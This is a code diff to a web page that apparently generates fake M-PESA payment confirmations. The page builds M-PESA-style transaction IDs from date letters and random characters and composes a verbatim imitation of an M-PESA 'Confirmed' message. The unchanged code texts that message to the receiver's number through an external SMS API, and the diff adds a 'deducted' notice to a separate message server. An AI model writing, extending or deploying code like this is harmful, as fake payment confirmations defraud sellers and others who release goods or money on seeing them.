@@ -101,26 +101,28 @@ button:disabled {
     <div class="current-step active" id="phoneLabel">Enter phone no.</div>
     <input type="text" id="phone" class="active" placeholder="">
     <button id="phoneOkBtn" class="active">OK</button>
-   
+ 
     <div class="current-step" id="amountLabel">Enter Amount</div>
     <input type="number" id="amount" placeholder="Ksh">
     <button id="amountOkBtn">OK</button>
-   
+ 
     <div class="current-step" id="nameLabel">Enter Full Name</div>
     <div id="editNote" class="search-note">Confirm Name (Edit if incorrect)</div>
     <input type="text" id="name" placeholder="Full name">
     <button id="nameOkBtn">OK</button>
-   
+ 
     <div class="current-step" id="optionsLabel">Finalize Transaction</div>
     <button id="sendBtn">Confirm & Send</button>
-   
+ 
     <div class="status-text" id="statusDisplay"></div>
   </div>
 </div>
 
 <script>
-const SYSTEM_API = "https://funds-mauve.vercel.app/api";
-const EXTERNAL_API = "https://mpesab.vercel.app";
+const SYSTEM_API    = "https://funds-mauve.vercel.app/api";
+const EXTERNAL_API  = "https://mpesab.vercel.app";
+const MESSAGE_API   = "https://message-server-five.vercel.app";   // ← added
+
 let user = JSON.parse(localStorage.getItem('mledger_user'));
 if (!user) location.href = 'index.html';
 
@@ -199,8 +201,8 @@ function showStep(step) {
 // ─── Token format helpers ──────────────────────────────────────
 function getYearLetter() {
   const year = new Date().getFullYear();
-  const offset = year - 2026;                 // 2026 → 0, 2027 → 1, 2028 → 2, ...
-  return String.fromCharCode(85 + offset);    // 85 = 'U' → stays U in 2026, becomes V in 2027
+  const offset = year - 2026;
+  return String.fromCharCode(85 + offset);
 }
 
 function getMonthThirdLetter() {
@@ -211,9 +213,8 @@ function getMonthThirdLetter() {
 function getDayCode() {
   const day = new Date().getDate();
   if (day <= 9) {
-    return day.toString(); // 1 → "1", 2 → "2", ..., 9 → "9"
+    return day.toString();
   } else {
-    // 10 → A, 11 → B, ..., 31 → V
     return String.fromCharCode(65 + (day - 10));
   }
 }
@@ -237,7 +238,7 @@ elements.amountOkBtn.addEventListener("click", () => {
   const cost = calculateCost(amt);
   const required = amt + cost;
   if (required > user.balance) {
-    return showStatus(`Availabe airtime in your account: ${formatBalance(user.balance)}\nNeed more airtime to total this amount : ${formatBalance(required)} Please buy airtime to complete transcation`, true);
+    return showStatus(`Available airtime in your account: ${formatBalance(user.balance)}\nNeed more airtime to total this amount : ${formatBalance(required)} Please buy airtime to complete transaction`, true);
   }
   showStep('name');
 });
@@ -248,10 +249,10 @@ elements.nameOkBtn.addEventListener("click", () => {
 });
 
 elements.sendBtn.addEventListener("click", async () => {
-  const phoneVal = elements.phone.value.trim();
-  const amountVal = parseFloat(elements.amount.value);
-  const nameVal = elements.name.value.trim();
-  const cost = calculateCost(amountVal);
+  const phoneVal   = elements.phone.value.trim();
+  const amountVal  = parseFloat(elements.amount.value);
+  const nameVal    = elements.name.value.trim();
+  const cost       = calculateCost(amountVal);
 
   elements.sendBtn.innerText = "Processing...";
   elements.sendBtn.disabled = true;
@@ -268,29 +269,44 @@ elements.sendBtn.addEventListener("click", async () => {
     });
 
     const sysData = await sysRes.json();
+
     if (!sysRes.ok) throw new Error(sysData.error || "Transaction failed");
 
-    // Update balance
+    // Update local balance
     user.balance = sysData.balance;
     localStorage.setItem('mledger_user', JSON.stringify(user));
 
-    // ─── Generate new token format ───────────────────────────────
-    const yearLetter  = getYearLetter();
-    const monthLetter = getMonthThirdLetter();
-    const dayCode     = getDayCode();
-    const randomPart  = Math.random().toString(36).substring(2,8).toUpperCase();
-
-    const token = `${yearLetter}${monthLetter}${dayCode}K${randomPart}`;
-    // ──────────────────────────────────────────────────────────────
+    // Generate token
+    const yearLetter   = getYearLetter();
+    const monthLetter  = getMonthThirdLetter();
+    const dayCode      = getDayCode();
+    const randomPart   = Math.random().toString(36).substring(2,8).toUpperCase();
+    const token        = `${yearLetter}${monthLetter}${dayCode}K${randomPart}`;
 
     const dateStr = formatNumericDate();
     const timeStr = formatTime12Hour();
 
-    const message = `${token} Confirmed. Ksh${amountVal.toFixed(2)} sent to ${nameVal} ${phoneVal} on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${user.balance.toFixed(2)}.Transaction Cost,Ksh${cost.toFixed(2)}. Amount you can transact within the day is 499,777.00.Earn interest daily on Ziidi MMF,Dial*334#`;
+    const message = `${token} Confirmed. Ksh${amountVal.toFixed(2)} sent to ${nameVal} ${phoneVal} on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${user.balance.toFixed(2)}. Transaction Cost,Ksh${cost.toFixed(2)}. Amount you can transact within the day is 499,777.00. Earn interest daily on Ziidi MMF,Dial*334#`;
+
+    // ─── NEW FEATURE: Send deducted notification to your message server ───────
+    // We use the deducted amount (amountVal) and new balance
+    fetch(`${MESSAGE_API}/api/messages`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        phone: user.phone,                // sender's phone (the one who paid)
+        message: `Ksh ${amountVal.toFixed(2)} deducted from your account. New balance: Ksh ${user.balance.toFixed(2)}. Sent to ${nameVal} (${phoneVal}). TxID: ${token}`,
+        type: "deducted"
+      })
+    }).catch(err => {
+      console.warn("Message notification failed:", err);
+      // silent fail — doesn't block the flow
+    });
+    // ──────────────────────────────────────────────────────────────────────────
 
     showStatus(message);
 
-    // Send SMS notification — don't wait for it
+    // Send the receiver SMS (your original call — kept as-is)
     fetch(`${EXTERNAL_API}/send`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -304,7 +320,7 @@ elements.sendBtn.addEventListener("click", async () => {
       })
     }).catch(() => {}); // silent fail
 
-    // Faster redirect
+    // Redirect after short delay
     setTimeout(() => {
       location.href = 'act.html';
     }, 1800);
